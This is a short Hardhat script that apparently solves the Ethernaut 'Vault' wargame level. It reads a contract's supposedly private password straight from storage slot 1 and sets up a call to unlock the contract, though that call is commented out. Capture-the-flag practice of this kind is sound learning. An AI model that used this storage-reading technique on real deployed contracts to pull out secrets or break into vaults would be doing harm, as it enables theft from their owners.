// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const BigNumber = require('bignumber.js');
const { assert } = require("chai");
// const { web3 } = require("@nomiclabs/hardhat-web3");

async function main() {

  const accounts = await hre.ethers.getSigners()
  let Level_Address = '0xc832317E2423831C77d62943658E71d79A05c9d7'
  const payer = accounts[0]

  // let Vault = await hre.ethers.getContractFactory('Vault')
  // var x = "0x2a1acd26847576a128e3dba3aa984feafffdf81f7c7b23bdf51e7bec1c15944c";
  // vault = await Vault.deploy(x)
  // await vault.deployed()
  // Level_Address = vault.address

  let key = await web3.eth.getStorageAt(Level_Address, 1)
  console.log('key', key)

  const abi = [
    // Read-Only Functions
    "function unlock(bytes32 _password) public",
    "function locked() public view returns (bool)",
  ];

  const vaultit = new hre.ethers.Contract(Level_Address, abi, payer);

  // let tx = await vaultit.unlock(key)
  // let txinfo = await tx.wait()
  // console.log('transfer txhash', txinfo.blockNumber, txinfo.transactionHash)

  console.log('final locked', await vaultit.locked())

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });



  // npx hardhat run 8.Vault/run.js